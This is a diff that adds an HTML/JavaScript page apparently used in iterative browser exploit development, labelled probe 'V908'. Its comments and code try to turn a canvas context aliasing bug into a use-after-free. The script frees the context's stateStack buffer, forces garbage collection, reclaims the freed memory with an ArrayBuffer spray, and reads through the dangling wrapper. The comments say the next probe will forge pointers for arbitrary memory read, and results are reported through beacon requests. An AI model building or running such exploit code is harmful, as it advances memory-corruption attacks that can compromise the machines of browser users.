@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V908</title></head>
+<body><pre id="out">V908 — dangle the stateStack buffer (drop all refs, read through the corpse)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<40;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++]||(new Image());
+  img.src='/beacon/V908-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+
+/*
+ * v907: alias works every fresh load; t0/t1 didn't free the ctx (state intact).
+ * This probe drops EVERY strong reference to the aliased context so the C++
+ * object and its 6400B stateStack buffer are freed while the stale innerCtx
+ * wrapper keeps pointing at the corpse:
+ *   step 4: read innerCtx.lineWidth with B1 freed but NOT reclaimed
+ *           -> 1014 = the chain innerCtx -> dead ctx -> freed B1 is alive
+ *   step 6: spray AB(6400) ZERO-fill -> if B1 is reclaimed and zeroed,
+ *           m_buffer read from... wait, the ctx chunk holds m_stateStack;
+ *           the zero AB(6400) wipes the state entries -> lineWidth read
+ *           follows m_buffer (still pointing at B1) -> reads 0.0 (not crash!)
+ *           lw=0 after the spray = B1 IS the read path = control achieved.
+ *   (A crash here would mean the zeroed entries break an invariant instead.)
+ * Any lw value that CHANGES from 1014 to something AB-controlled after the
+ * spray proves the state buffer is under our hand -> v909 forges real
+ * pointers into it (arb read via lineWidth / getLineDash).
+ */
+
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/V908-'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+
+/* PHASE 1: v651-identical alias */
+var c1=document.createElement('canvas');c1.width=1;c1.height=1;
+var innerCtx=null;
+var opts={};
+Object.defineProperty(opts,'alpha',{get:function(){
+  innerCtx=c1.getContext('2d');
+  innerCtx.lineWidth=99999.5;
+  return true;
+}});
+c1.getContext('bitmaprenderer',opts);
+
+var spray=[];
+for(var s=0;s<300;s++){
+  var sc=document.createElement('canvas');sc.width=1;sc.height=1;
+  spray.push({c:sc,x:sc.getContext('2d')});
+}
+var aliasIdx=-1;
+if(innerCtx){
+  innerCtx.lineWidth=55555.5;
+  for(var k=0;k<spray.length;k++){
+    if(spray[k].x.lineWidth===55555.5){aliasIdx=k;break;}
+  }
+}
+b('P1 alias=' + aliasIdx);
+if(aliasIdx<0){ b('DEAD no-alias'); }
+else {
+  /* PHASE 2: grow stateStack -> B1, markers on each level */
+  for(var i=0;i<15;i++){ innerCtx.save(); innerCtx.lineWidth=1000+i; }
+  b('P2 grown lw=' + innerCtx.lineWidth);
+
+  /* PHASE 3: drop every strong ref to the live context */
+  spray[aliasIdx].x = null;         /* live JS wrapper gone */
+  spray[aliasIdx].c = null;
+  if (spray[aliasIdx].c && spray[aliasIdx].c.parentNode) {
+    spray[aliasIdx].c.parentNode.removeChild(spray[aliasIdx].c);
+  }
+  c1 = null;                        /* the element gone */
+  /* GC pressure: churn allocations so the collector runs synchronously-ish */
+  for (var g = 0; g < 200; g++) { var junk = new ArrayBuffer(65536); }
+  b('P3 refs-dropped');
+
+  /* PHASE 4: read through the corpse with B1 freed but NOT reclaimed */
+  b('P4-PRE');
+  var lw1 = null;
+  try { lw1 = innerCtx.lineWidth; } catch (e) { lw1 = 'ERR:' + e.name; }
+  b('P4 lw=' + lw1);
+
+  /* PHASE 5: AB(6400) ZERO spray — reclaim B1 (if that is the read path) */
+  var abs=[];
+  for(var a=0;a<200;a++){ abs.push(new ArrayBuffer(6400)); }
+  b('P5 abspray n=' + abs.length);
+
+  /* PHASE 6: read again — a change from lw1 proves B1 is the read path */
+  b('P6-PRE');
+  var lw2 = null;
+  try { lw2 = innerCtx.lineWidth; } catch (e) { lw2 = 'ERR:' + e.name; }
+  b('P6 lw=' + lw2);
+
+  if (typeof lw1 === 'number' && typeof lw2 === 'number') {
+    if (lw1 === lw2 && Math.abs(lw1 - 1014) < 0.01) {
+      b('VERDICT chain-not-through-B1 (both 1014)');
+    } else if (lw1 !== lw2) {
+      b('VERDICT ***B1-CONTROLLED lw1=' + lw1 + ' lw2=' + lw2 + '***');
+    } else {
+      b('VERDICT unchanged lw=' + lw1);
+    }
+  } else {
+    b('VERDICT crashed-or-err lw1=' + lw1 + ' lw2=' + lw2);
+  }
+}
+</script></body></html>
